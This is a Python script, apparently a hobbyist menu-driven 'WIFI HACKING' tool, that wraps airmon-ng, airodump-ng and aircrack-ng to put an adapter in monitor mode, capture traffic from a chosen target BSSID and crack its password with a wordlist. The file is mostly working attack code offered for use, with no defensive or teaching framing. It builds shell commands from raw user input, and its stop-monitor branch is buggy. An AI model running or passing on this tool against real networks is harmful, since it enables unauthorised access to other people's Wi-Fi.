import os
import webbrowser

print("\n")
print("""

█░█░█ █ █▀▀ █   █░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀   ▄▀█ █░█ ▀█▀ █▀█
▀▄▀▄▀ █ █▀░ █   █▀█ █▀█ █▄▄ █░█ █ █░▀█ █▄█   █▀█ █▄█ ░█░ █▄█ BY YATHARTH\n
""")
print("#####################################DEVELOPER INFO#################################################")
print("\nfollow on instagram @im.yatharth")
print("Visit Github:-  https://github.com/yatharthgeek/")
print("Subscribe YouTube Channel :- https://www.youtube.com/channel/UC6AXassf_ZGu-icFW8iT0-Q")
print(" \n")
print("####################################################################################################\n")

print("[-] MAIN MENU [-]")
print("")

print("[1] WIFI HACKING ")
print("[2] CHECK FOR UPDATES")
print("[3] ABOUT")
print("[4] EXIT")
print("")

while 1==1 :
    bash = int(input("( wifi-hack ) : "))

    print(" ")

    if bash==1:
        print("[-] WIFI HACKING [-]")
        print("")
        print("[1] SELECT ADAPTER ")
        print("[2] EXIT")

        bash1= int(input("( wifi-hack/m01 ) : "))

        if bash1 == 1:
            os.system("iwconfig")

            print("/n Choose Your Adapter : \n")

            adapter=input("( wifi-hack/m01/ad ) : ")
            print("/n ADAPTER NAME SAVED")

            print("")
            print("[-] WIFI HACKING [-]")
            print("")
            print("[1] START SCANNING ")
            print("[2] EXIT")

            bash2 = int(input("( wifi-hack/main ) : "))

            if bash2 == 1:
                mmd= "airmon-ng start "+adapter
                code1= "airodump-ng "+adapter+"mon"

                os.system(mmd)
                os.system(code1)

                print("")

                bssid= input("[target BSSID] >>")
                file= input("[File Name] >>")
                channel=input("[Channel No] >>")
                code2= "airodump-ng -w "+file+" -c "+channel+" --bssid "+bssid+" "+adapter+"mon"

                os.system(code2)

                print("/n Details Saved : \n [-] CRACK PASSWORD [-]")
                print("[1] START CRACKING ")
                print("[2] STOP MONITOR MODE \n")

                bash3 = int(input("( wifi-hack/main/crack ) : "))

                print('')

                if bash3 == 1 :
                    capfile=input("[Cap file location] >> ")
                    wordlist=input("[Wordlist location] >> ")

                    code3= "aircrack-ng "+capfile+" -w "+wordlist

                    os.system(code3)


                if bash == 2 :
                    code4= "airmon-ng stop "+adapter+"mon" 
                    os.system(code1)

                









            if bash2== 2 :
                break

            

            


        
        if bash1 == 2:
            break

        

    if bash == 2:
        webbrowser.open("https://github.com/yatahrthgeek")

    if bash == 3 :
        webbrowser.open("https://linktr.ee/technicalknow")

    if bash == 4 :
        break

    